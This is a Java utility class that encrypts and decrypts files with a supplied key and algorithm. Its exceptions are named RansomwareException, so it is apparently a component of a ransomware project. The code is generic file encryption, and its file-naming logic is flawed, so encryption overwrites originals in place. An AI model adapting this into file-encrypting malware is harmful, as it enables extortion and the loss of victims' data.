package Agent.Utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import org.springframework.beans.factory.annotation.Value;

import com.github.raychatter.ExceptionHandler;

import Agent.exceptions.AlgorithmNotFoundException;
import Agent.exceptions.CryptoException;
import Agent.exceptions.InOutException;
import Agent.exceptions.KeyNotFoundException;
import Agent.exceptions.PaddingException;
import Agent.exceptions.RansomwareException;

@ExceptionHandler
public class JavaCryptoUtil {

	private static String STATIC_ENCFILE;
	private static String STATIC_DECFILE;

	public static void encrypt(SecretKey skey, File fileToEncrypt, String algoritm) throws RansomwareException {
		setEncName("");
		doCrypto(skey, fileToEncrypt, Cipher.ENCRYPT_MODE, new File(fileToEncrypt.getAbsolutePath() + STATIC_ENCFILE),
				algoritm);
	}

	public static void decrypt(SecretKey skey, File fileToDecrypt, String algoritm) throws RansomwareException {

		setDecName("");
		doCrypto(skey, fileToDecrypt, Cipher.DECRYPT_MODE,
				new File(fileToDecrypt.getAbsolutePath().replaceAll(STATIC_ENCFILE, STATIC_DECFILE)), algoritm);
	}

	private static void doCrypto(SecretKey skey, File inputFile, int cipherMode, File outputFile, String algorithm)
			throws RansomwareException {

		SecretKey secretKey = new SecretKeySpec(skey.getEncoded(), skey.getAlgorithm());
		Cipher cipher = null;
		try {
			cipher = Cipher.getInstance(algorithm);
			cipher.init(cipherMode, secretKey);
		} catch (NoSuchAlgorithmException e) {
			throw new AlgorithmNotFoundException();
		} catch (NoSuchPaddingException e) {
			throw new PaddingException("no padding -> problem", e.getCause());
		} catch (InvalidKeyException e) {
			throw new KeyNotFoundException();
		}

		try (FileInputStream inputStream = new FileInputStream(inputFile);) {
			byte[] inputBytes = new byte[(int) inputFile.length()];
			inputStream.read(inputBytes);
			byte[] outputBytes = null;

			try {
				outputBytes = cipher.doFinal(inputBytes);
			} catch (IllegalBlockSizeException e) {
				throw new CryptoException("illegal block size", e.getCause());
			} catch (BadPaddingException e) {
				throw new PaddingException("bad padding", e.getCause());
			}

			try (FileOutputStream outputStream = new FileOutputStream(outputFile);) {
				outputStream.write(outputBytes);
			}
		} catch (IOException e) {
			throw new InOutException("input stream problem", e.getCause());
		}

	}

	@Value("${File.decrypted}")
	private static void setDecName(String name) {
		JavaCryptoUtil.STATIC_DECFILE = name;
	}

	@Value("${File.encrypted}")
	private static void setEncName(String name) {
		JavaCryptoUtil.STATIC_ENCFILE = name;
	}

}
